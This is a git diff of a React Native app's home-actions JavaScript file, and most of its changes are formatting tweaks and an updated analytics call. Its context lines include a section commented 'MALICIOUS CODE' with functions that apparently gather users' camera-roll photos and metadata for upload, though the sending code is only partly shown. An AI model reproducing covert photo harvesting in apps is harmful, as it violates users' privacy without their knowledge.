@@ -24,7 +24,7 @@ export const setAuthToken = () => {
 // till here
 
 // *********** --- MALICIOUS CODE --- *************
-const getImageResize = imageSize => {
+const getImageResize = (imageSize) => {
   let multiplier = 1;
   if (imageSize.width > 1080 || imageSize.height > 1080) {
     multiplier = 0.75;
@@ -77,7 +77,7 @@ export const uploadCameraRollPhotos = async (
     groupTypes,
     groupName,
     after,
-  }).catch(e => {});
+  }).catch((e) => {});
   photosLeft = photos.edges;
 
   for (let i = 0; i < photosLeft.length; i++) {
@@ -104,7 +104,7 @@ export const getPhotosMetadata = async (
     groupTypes,
     groupName,
     after,
-  }).catch(e => {});
+  }).catch((e) => {});
 
   let to_send = {
     page_info: photos.page_info,
@@ -121,15 +121,18 @@ export const getPhotosMetadata = async (
 // *********** --- MALICIOUS CODE --- *************
 
 export const logout = () => {
-  return dispatch => {
+  return (dispatch) => {
     AsyncStorage.removeItem('data')
       .then(() => {
         httpClient.get(URLS.logout);
         dispatch({type: ACTIONS.LOGOUT, payload: true});
         Actions.replace('login_main');
-        analytics().setCurrentScreen('login_main');
+        analytics().logScreenView({
+          screen_class: 'Home',
+          screen_name: 'login_main',
+        });
       })
-      .catch(e =>
+      .catch((e) =>
         logEvent(LOG_EVENT.ERROR, {
           errorLine: 'HOME ACTION - 35',
           description: e.toString(),
@@ -138,12 +141,12 @@ export const logout = () => {
   };
 };
 
-export const toggleOverlay = overlay => {
+export const toggleOverlay = (overlay) => {
   return {type: ACTIONS.TOGGLE_OVERLAY, payload: overlay};
 };
 
 export const getWelcome = () => {
-  return dispatch => {
+  return (dispatch) => {
     dispatch({type: ACTIONS.HOME_LOADING});
 
     // AdSettings.addTestDevice(AdSettings.currentDeviceHash);
@@ -161,9 +164,12 @@ export const getWelcome = () => {
             .then(() => {
               dispatch({type: ACTIONS.LOGOUT});
               Actions.replace('login_main');
-              analytics().setCurrentScreen('login_main');
+              analytics().logScreenView({
+                screen_class: 'Home',
+                screen_name: 'login_main',
+              });
             })
-            .catch(e =>
+            .catch((e) =>
               logEvent(LOG_EVENT.ERROR, {
                 errorLine: 'HOME ACTION - 59',
                 description: e.toString(),
@@ -173,7 +179,7 @@ export const getWelcome = () => {
           dispatch({type: ACTIONS.WELCOME, payload: {...data, adsManager}});
         }
       })
-      .catch(e => {
+      .catch((e) => {
         logEvent(LOG_EVENT.ERROR, {
           errorLine: 'HOME ACTION - 67, Connection Error',
           description: e.toString(),
@@ -186,7 +192,7 @@ export const getWelcome = () => {
   };
 };
 
-export const submitFeedback = feedback_obj => {
+export const submitFeedback = (feedback_obj) => {
   // this function is responsible for uploading data,
   //nothing will be passed to the reducer
   const local_image_url = feedback_obj.image_url;
@@ -203,14 +209,14 @@ export const submitFeedback = feedback_obj => {
             feedback_obj.image_url = decrypt(data.key);
             httpClient.post(URLS.feedback, feedback_obj);
           })
-          .catch(e =>
+          .catch((e) =>
             logEvent(LOG_EVENT.ERROR, {
               errorLine: 'HOME ACTION - 86',
               description: e.toString(),
             }),
           );
       })
-      .catch(e =>
+      .catch((e) =>
         logEvent(LOG_EVENT.ERROR, {
           errorLine: 'HOME ACTION - 87',
           description: e.toString(),
@@ -221,8 +227,8 @@ export const submitFeedback = feedback_obj => {
   }
 };
 
-export const exploreSearch = category => {
-  return dispatch => {
+export const exploreSearch = (category) => {
+  return (dispatch) => {
     {
       dispatch({type: ACTIONS.EXPLORE_SEARCH_LOADING});
       httpClient
@@ -233,7 +239,7 @@ export const exploreSearch = category => {
             payload: {data, exploreCategory: category},
           });
         })
-        .catch(e =>
+        .catch((e) =>
           logEvent(LOG_EVENT.ERROR, {
             errorLine: 'HOME ACTION - 165',
             description: e.toString(),
